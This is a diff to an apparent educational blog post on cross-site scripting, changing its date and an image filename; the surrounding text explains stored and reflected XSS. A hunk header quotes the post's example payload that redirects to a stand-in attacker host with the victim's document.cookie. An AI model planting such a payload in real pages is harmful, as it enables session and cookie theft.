@@ -1,6 +1,6 @@
 ---
 slug: xss
-date: 2020-06-21
+date: 2020-06-28
 title: 'Be careful of XSS attacks'
 description: 'Cross-Site Scripting (XSS) attacks are a type of injection, in which malicious scripts are injected into otherwise benign and trusted websites.'
 published: true
@@ -64,7 +64,7 @@ window.location="http://hacker.com/?cookie=" + document.cookie
 # Stored and Reflected XSS Attacks <a name="paragraph5"></a>
 XSS attacks can generally be categorized into two categories: stored and reflected.
 ## Stored XSS Attacks (No Need for Social engineering) <a name="paragraph5.1"></a>
-![stored](./stored-xss.png)
+![stored](./stored-XSS.png)
 Stored attacks are those where the injected script is permanently stored on the target servers, such as in a database, in a message forum, visitor log, comment field, etc. So all your websites visitors are going to be affected by the script. The victim then retrieves the malicious script from the server when it requests the stored information. Stored XSS is also sometimes referred to as Persistent.
 ## Reflected XSS Attacks (Need Social engineering) <a name="paragraph5.2"></a>
 ![reflected](./reflected-xss.png)
